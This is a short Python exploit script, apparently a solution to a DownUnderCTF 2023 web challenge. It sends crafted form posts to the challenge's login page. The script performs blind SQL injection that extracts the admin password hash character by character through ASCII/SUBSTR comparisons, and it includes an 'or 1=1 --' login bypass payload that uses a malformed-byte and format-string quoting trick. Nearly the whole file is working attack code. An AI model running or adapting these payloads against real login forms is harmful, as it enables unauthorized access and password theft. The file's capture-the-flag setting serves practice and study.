import requests


possbile_chars = "0123456789abcdef"
URL = "https://web-smooth-jazz-3a2c947be0c6.2023.ductf.dev/"

hash = ""


def get_hash():
    count = 1
    hash = ""
    while count < 41:
        for i in possbile_chars:
            resp = requests.post(
                URL,
                data=f"username=admin%bf%1$2c and ASCII(SUBSTR(password,{count},1))={ord(i)} -- &password=9d2",
                headers={"Content-Type": "application/x-www-form-urlencoded"},
            )

            if "admin" in resp.text:
                hash += i
                print(hash)
                count += 1
                break
            if i == "f":
                exit(0)


data = "username=admin%bf%1$2c or 1=1 -- &password=9d2"

passed_data = f"username=admin%bf%1$2c -- &password=9d2"

res = requests.post(
    URL, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"}
)
